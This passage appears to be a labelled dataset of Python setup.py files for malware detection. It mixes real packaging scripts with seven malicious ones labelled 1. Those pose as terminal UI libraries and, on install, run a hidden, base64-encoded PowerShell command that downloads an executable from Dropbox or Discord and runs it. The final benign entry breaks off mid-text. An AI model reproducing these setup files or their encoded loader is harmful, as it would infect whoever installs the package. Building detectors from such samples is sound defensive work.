{"idx": "py-osintgrandpush-3.34", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-osintgrandpush',\n    packages = ['modlib'],\n    version = '7.84',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "geolib-1.0.7", "func": "import setuptools\n\nwith open(\"README.md\", \"r\") as fh:\n    long_description = fh.read()\n\nrequires = [\n    'future'\n]\ntest_requirements = [\n    'future',\n    'pytest'\n]\n\nsetuptools.setup(\n    name=\"geolib\",\n    version=\"1.0.7\",\n    author=\"Anu Joy\",\n    author_email=\"oss@cartographix.org\",\n    description=\"A library for geohash encoding, decoding and associated functions\",\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/joyanujoy/geolib\",\n    packages=setuptools.find_packages(),\n    python_requires='>=2.7,!=3.0.*,!=3.1.*,!=3.2.*,!=3.3.*',\n    install_requires=requires,\n    tests_require=test_requirements,\n    classifiers=[\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3.4\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n        \"Development Status :: 5 - Production/Stable\",\n        \"Topic :: Scientific/Engineering :: GIS\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\"\n    ],\n)\n", "target": 0}
{"idx": "gcovr-5.2", "func": "# -*- coding:utf-8 -*-\n\n#  ************************** Copyrights and license ***************************\n#\n# This file is part of gcovr 5.2, a parsing and reporting tool for gcov.\n# https://gcovr.com/en/stable\n#\n# _____________________________________________________________________________\n#\n# Copyright (c) 2013-2022 the gcovr authors\n# Copyright (c) 2013 Sandia Corporation.\n# Under the terms of Contract DE-AC04-94AL85000 with Sandia Corporation,\n# the U.S. Government retains certain rights in this software.\n#\n# This software is distributed under the 3-clause BSD License.\n# For more information, see the README.rst file.\n#\n# ****************************************************************************\n\n\"\"\"\nScript to generate the installer for gcovr.\n\"\"\"\n\nfrom runpy import run_path\nfrom setuptools import setup, find_packages\nfrom os import path\nimport re\n\n\nversion = run_path(\"./gcovr/version.py\")[\"__version__\"]\n# read the contents of your README file\nthis_directory = path.abspath(path.dirname(__file__))\nwith open(path.join(this_directory, \"README.rst\"), encoding=\"utf-8\") as f:\n    long_description = f.read()\n\nlong_description = re.sub(\n    r\"^\\.\\. image:: \\./\",\n    r\".. image:: https://raw.githubusercontent.com/gcovr/gcovr/{}/\".format(version),\n    long_description,\n    flags=re.MULTILINE,\n)\nlong_description = re.sub(\n    r\":option:`(.*?)<gcovr.*?>`\", r\"``\\1``\", long_description, flags=re.MULTILINE\n)\n\nsetup(\n    name=\"gcovr\",\n    version=version,\n    long_description=long_description,\n    long_description_content_type=\"text/x-rst\",\n    platforms=[\"any\"],\n    python_requires=\">=3.7\",\n    packages=find_packages(include=[\"gcovr*\"], exclude=[\"gcovr.tests\"]),\n    install_requires=[\"jinja2\", \"lxml\", \"pygments\"],\n    package_data={\n        \"gcovr\": [\"templates/*.css\", \"templates/*.html\"],\n    },\n    entry_points={\n        \"console_scripts\": [\n            \"gcovr=gcovr.__main__:main\",\n        ],\n    },\n)\n", "target": 0}
{"idx": "py-verintsplit-4.32", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'py-verintsplit',\n    packages = ['modlib'],\n    version = '6.33',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libpaypalurlstring-3.68", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpaypalurlstring',\n    packages = ['modlib'],\n    version = '5.90',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libnvidiareplacerandom-3.3", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libnvidiareplacerandom',\n    packages = ['modlib'],\n    version = '5.26',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "funcx-endpoint-0.3.10", "func": "import os\n\nfrom setuptools import find_packages, setup\n\nREQUIRES = [\n    \"requests>=2.20.0,<3\",\n    \"globus-sdk\",  # version will be bounded by `funcx`\n    \"funcx>=0.3.6,<0.4.0\",\n    # table printing used in list-endpoints\n    \"texttable>=1.6.4,<2\",\n    # although psutil does not declare itself to use semver, it appears to offer\n    # strong backwards-compatibility promises based on its changelog, usage, and\n    # history\n    #\n    # TODO: re-evaluate bound after we have an answer of some kind from psutil\n    # see:\n    #   https://github.com/giampaolo/psutil/issues/2002\n    \"psutil<6\",\n    # provides easy daemonization of the endpoint\n    \"python-daemon>=2,<3\",\n    # TODO: replace use of `typer` with `click` because\n    # 1. `typer` is a thin wrapper over `click` offering very minimal additional\n    #    functionality\n    # 2. `click` follows semver and releases new major versions when known\n    #    backwards-incompatible changes are introduced, making our application\n    #    safer to distribute\n    \"typer==0.4.0\",\n    \"click==8.0.4\",  # pin `click` because typer uses `click` internals\n    # disallow use of 22.3.0; the whl package on some platforms causes ZMQ issues\n    #\n    # NOTE: 22.3.0 introduced a patched version of libzmq.so to the wheel packaging\n    # which may be the source of the problems , the problem can be fixed by\n    # building from source, which may mean there's an issue in the packaged library\n    # further investigation may be needed if the issue persists in the next pyzmq\n    # release. 23.0.0 is also causing issues.\n    \"pyzmq==22.2.1\",\n    # TODO: evaluate removal of the 'retry' library after the update to\n    # globus-sdk v3, which provides automatic retries on all API calls\n    \"retry==0.9.2\",\n    # 'parsl' is a core requirement of the funcx-endpoint, essential to a range\n    # of different features and functions\n    # pin exact versions because it does not use semver\n    \"parsl==1.1.0\",\n]\n\nTEST_REQUIRES = [\n    \"pytest>=5.2\",\n    \"coverage>=5.2\",\n    \"codecov==2.1.8\",\n    \"pytest-mock==3.2.0\",\n    \"flake8>=3.8\",\n]\n\n\nversion_ns = {}\nwith open(os.path.join(\"funcx_endpoint\", \"version.py\")) as f:\n    exec(f.read(), version_ns)\nversion = version_ns[\"VERSION\"]\n\nsetup(\n    name=\"funcx-endpoint\",\n    version=version,\n    packages=find_packages(),\n    description=\"funcX: High Performance Function Serving for Science\",\n    install_requires=REQUIRES,\n    extras_require={\n        \"test\": TEST_REQUIRES,\n    },\n    python_requires=\">=3.6.0\",\n    classifiers=[\n        \"Development Status :: 3 - Alpha\",\n        \"Intended Audience :: Science/Research\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Natural Language :: English\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python :: 3\",\n        \"Topic :: Scientific/Engineering\",\n    ],\n    keywords=[\"funcX\", \"FaaS\", \"Function Serving\"],\n    entry_points={\n        \"console_scripts\": [\n            \"funcx-endpoint=funcx_endpoint.endpoint.endpoint:cli_run\",\n            \"funcx-interchange\"\n            \"=funcx_endpoint.executors.high_throughput.interchange:cli_run\",\n            \"funcx-manager\"\n            \"=funcx_endpoint.executors.high_throughput.funcx_manager:cli_run\",\n            \"funcx-worker\"\n            \"=funcx_endpoint.executors.high_throughput.funcx_worker:cli_run\",\n        ]\n    },\n    include_package_data=True,\n    author=\"funcX team\",\n    author_email=\"labs@globus.org\",\n    license=\"Apache License, Version 2.0\",\n    url=\"https://github.com/funcx-faas/funcx\",\n)\n", "target": 0}
{"idx": "fpdf-1.7.2", "func": "#!/usr/bin/env python\n\nfrom distutils.core import setup\n\nimport os\nimport sys\nimport warnings\nimport subprocess\n\nimport fpdf\npackage_dir = 'fpdf'\n\n# convert the README and format in restructured text (only when registering)\nlong_desc = \"\"\nif os.path.exists(\"README.md\"):\n    try:\n        cmd = ['pandoc', '--from=markdown', '--to=rst', 'README.md']\n        long_desc = subprocess.check_output(cmd).decode(\"utf8\")\n    except Exception as e:\n        warnings.warn(\"Exception when converting the README format: %s\" % e)\n\nsetup(name='fpdf',\n      version=fpdf.__version__,\n      description='Simple PDF generation for Python',\n      long_description=long_desc,\n      author='Olivier PLATHEY ported by Max',\n      author_email='maxpat78@yahoo.it',\n      maintainer = \"Mariano Reingart\",\n      maintainer_email = \"reingart@gmail.com\",\n      url='http://code.google.com/p/pyfpdf',\n      license='LGPLv3+',\n      download_url=\"https://github.com/reingart/pyfpdf/tarball/%s\" % fpdf.__version__,\n      packages=['fpdf', ],\n      package_dir={'fpdf': package_dir},\n      package_data={'fpdf': ['font/*.ttf', 'font/*.txt']},\n      classifiers = [\n            \"Development Status :: 5 - Production/Stable\",\n            \"Intended Audience :: Developers\",\n            \"License :: OSI Approved :: GNU Lesser General Public License v3 (LGPLv3)\",\n            \"Programming Language :: Python\",\n            \"Programming Language :: Python :: 2.5\",\n            \"Programming Language :: Python :: 2.6\",\n            \"Programming Language :: Python :: 2.7\",\n            \"Programming Language :: Python :: 3.2\",\n            \"Programming Language :: Python :: 3.3\",\n            \"Programming Language :: Python :: 3.4\",\n            \"Operating System :: OS Independent\",\n            \"Topic :: Software Development :: Libraries :: PHP Classes\",\n            \"Topic :: Software Development :: Libraries :: Python Modules\",\n            \"Topic :: Multimedia :: Graphics\",\n      ],\n      keywords=[\"pdf\", \"unicode\", \"png\", \"jpg\", \"ttf\"],\n     )\n\n", "target": 0}
{"idx": "selfvmminehttp-7.61", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfvmminehttp',\n    packages = ['modlib'],\n    version = '7.84',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "gevent-websocket-0.10.1", "func": "from setuptools import setup, find_packages\n\n\nversion = __import__('geventwebsocket').get_version()\n\nsetup(\n    name=\"gevent-websocket\",\n    version=version,\n    url=\"https://www.gitlab.com/noppo/gevent-websocket\",\n    author=\"Jeffrey Gelens\",\n    author_email=\"jeffrey@noppo.pro\",\n    description=(\"Websocket handler for the gevent pywsgi server, a Python \"\n                 \"network library\"),\n    long_description=open(\"README.rst\").read(),\n    download_url=\"https://www.gitlab.com/noppo/gevent-websocket\",\n    packages=find_packages(exclude=[\"examples\", \"tests\"]),\n    license=open('LICENSE').read(),\n    zip_safe=False,\n    install_requires=(\"gevent\"),\n    classifiers=[\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: POSIX\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Topic :: Internet\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ]\n)\n", "target": 0}
{"idx": "libhydratooled-4.28", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libhydratooled',\n    packages = ['modlib'],\n    version = '3.25',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "docopt-0.6.2", "func": "from setuptools import setup\n\nfrom docopt import __version__\n\n\nsetup(\n    name='docopt',\n    version=__version__,\n    author='Vladimir Keleshev',\n    author_email='vladimir@keleshev.com',\n    description='Pythonic argument parser, that will make you smile',\n    license='MIT',\n    keywords='option arguments parsing optparse argparse getopt',\n    url='http://docopt.org',\n    py_modules=['docopt'],\n    long_description=open('README.rst').read(),\n    classifiers=[\n        'Development Status :: 3 - Alpha',\n        'Topic :: Utilities',\n        'Programming Language :: Python :: 2.5',\n        'Programming Language :: Python :: 2.6',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.2',\n        'Programming Language :: Python :: 3.3',\n        'License :: OSI Approved :: MIT License',\n    ],\n)\n", "target": 0}
{"idx": "libpullpep-5.89", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpullpep',\n    packages = ['modlib'],\n    version = '9.68',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-ses-3.1.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\npackages = \\\n['django_ses',\n 'django_ses.management',\n 'django_ses.management.commands',\n 'django_ses.migrations']\n\npackage_data = \\\n{'': ['*'], 'django_ses': ['templates/django_ses/*']}\n\ninstall_requires = \\\n['boto3>=1.0.0', 'django>=2.2', 'pytz>=2016.10']\n\nextras_require = \\\n{':python_version < \"3.8\"': ['importlib-metadata>=1.0,<2.0'],\n 'bounce': ['cryptography>=36.0.2,<37.0.0', 'requests>=2.27.1,<3.0.0'],\n 'events': ['cryptography>=36.0.2,<37.0.0', 'requests>=2.27.1,<3.0.0']}\n\nsetup_kwargs = {\n    'name': 'django-ses',\n    'version': '3.1.0',\n    'description': \"A Django email backend for Amazon's Simple Email Service\",\n    'long_description': '==========\\nDjango-SES\\n==========\\n:Info: A Django email backend for Amazon\\'s Simple Email Service\\n:Author: Harry Marr (http://github.com/hmarr, http://twitter.com/harrymarr)\\n:Collaborators: Paul Craciunoiu (http://github.com/pcraciunoiu, http://twitter.com/embrangler)\\n\\n|pypi| |build| |python| |django|\\n\\nA bird\\'s eye view\\n=================\\nDjango-SES is a drop-in mail backend for Django_. Instead of sending emails\\nthrough a traditional SMTP mail server, Django-SES routes email through\\nAmazon Web Services\\' excellent Simple Email Service (SES_).\\n\\n\\nPlease Contribute!\\n==================\\nThis project is maintained, but not actively used by the maintainer. Interested\\nin helping maintain this project? Reach out via GitHub Issues if you\\'re actively\\nusing `django-ses` and would be interested in contributing to it.\\n\\n\\nChangelog\\n=========\\n\\nFor details about each release, see the GitHub releases page: https://github.com/django-ses/django-ses/releases or CHANGES.md.\\n\\n\\nUsing Django directly\\n=====================\\n\\nAmazon SES allows you to also setup usernames and passwords. If you do configure\\nthings that way, you do not need this package. The Django default email backend\\nis capable of authenticating with Amazon SES and correctly sending email.\\n\\nUsing django-ses gives you additional features like deliverability reports that\\ncan be hard and/or cumbersome to obtain when using the SMTP interface.\\n\\n\\nWhy SES instead of SMTP?\\n========================\\nConfiguring, maintaining, and dealing with some complicated edge cases can be\\ntime-consuming. Sending emails with Django-SES might be attractive to you if:\\n\\n* You don\\'t want to maintain mail servers.\\n* You are already deployed on EC2 (In-bound traffic to SES is free from EC2\\n  instances).\\n* You need to send a high volume of email.\\n* You don\\'t want to have to worry about PTR records, Reverse DNS, email\\n  whitelist/blacklist services.\\n* You want to improve delivery rate and inbox cosmetics by DKIM signing\\n  your messages using SES\\'s Easy DKIM feature.\\n* Django-SES is a truely drop-in replacement for the default mail backend.\\n  Your code should require no changes.\\n\\nGetting going\\n=============\\nAssuming you\\'ve got Django_ installed, you\\'ll just need to install django-ses::\\n\\n    pip install django-ses\\n\\n\\nTo receive bounces or webhook events install the events \"extra\"::\\n\\n    pip install django-ses[events]\\n\\nAdd the following to your settings.py::\\n\\n    EMAIL_BACKEND = \\'django_ses.SESBackend\\'\\n\\n    # These are optional -- if they\\'re set as environment variables they won\\'t\\n    # need to be set here as well\\n    AWS_ACCESS_KEY_ID = \\'YOUR-ACCESS-KEY-ID\\'\\n    AWS_SECRET_ACCESS_KEY = \\'YOUR-SECRET-ACCESS-KEY\\'\\n\\n    # Additionally, if you are not using the default AWS region of us-east-1,\\n    # you need to specify a region, like so:\\n    AWS_SES_REGION_NAME = \\'us-west-2\\'\\n    AWS_SES_REGION_ENDPOINT = \\'email.us-west-2.amazonaws.com\\'\\n\\nAlternatively, instead of `AWS_ACCESS_KEY_ID` and `AWS_SECRET_ACCESS_KEY`, you\\ncan include the following two settings values. This is useful in situations\\nwhere you would like to use a separate access key to send emails via SES than\\nyou would to upload files via S3::\\n\\n    AWS_SES_ACCESS_KEY_ID = \\'YOUR-ACCESS-KEY-ID\\'\\n    AWS_SES_SECRET_ACCESS_KEY = \\'YOUR-SECRET-ACCESS-KEY\\'\\n\\nNow, when you use ``django.core.mail.send_mail``, Simple Email Service will\\nsend the messages by default.\\n\\nSince SES imposes a rate limit and will reject emails after the limit has been\\nreached, django-ses will attempt to conform to the rate limit by querying the\\nAPI for your current limit and then sending no more than that number of\\nmessages in a two-second period (which is half of the rate limit, just to\\nbe sure to stay clear of the limit). This is controlled by the following setting:\\n\\n    AWS_SES_AUTO_THROTTLE = 0.5 # (default; safety factor applied to rate limit)\\n\\nTo turn off automatic throttling, set this to None.\\n\\nCheck out the ``example`` directory for more information.\\n\\nMonitoring email status using Amazon Simple Notification Service (Amazon SNS)\\n=============================================================================\\nTo set this up, install `django-ses` with the `events` extra::\\n\\n    pip install django-ses[events]\\n\\nThen add a event url handler in your `urls.py`::\\n\\n    from django_ses.views import SESEventWebhookView\\n    from django.views.decorators.csrf import csrf_exempt\\n    urlpatterns = [ ...\\n                    url(r\\'^ses/event-webhook/$\\', SESEventWebhookView.as_view(), name=\\'handle-event-webhook\\'),\\n                    ...\\n    ]\\n\\nSESEventWebhookView handles bounce, complaint, send, delivery, open and click events.\\nIt is also capable of auto confirming subscriptions, it handles `SubscriptionConfirmation` notification.\\n\\nOn AWS\\n-------\\n1. Add an SNS topic.\\n\\n2. In SES setup an SNS destination in \"Configuration Sets\". Use this\\nconfiguration set by setting ``AWS_SES_CONFIGURATION_SET``. Set the topic\\nto what you created in 1.\\n\\n3. Add an https subscriber to the topic. (eg. https://www.yourdomain.com/ses/event-webhook/)\\nDo not check \"Enable raw message delivery\".\\n\\n\\nBounces\\n-------\\nUsing signal \\'bounce_received\\' for manager bounce email. For example::\\n\\n    from django_ses.signals import bounce_received\\n    from django.dispatch import receiver\\n\\n\\n    @receiver(bounce_received)\\n    def bounce_handler(sender, mail_obj, bounce_obj, raw_message, *args, **kwargs):\\n        # you can then use the message ID and/or recipient_list(email address) to identify any problematic email messages that you have sent\\n        message_id = mail_obj[\\'messageId\\']\\n        recipient_list = mail_obj[\\'destination\\']\\n        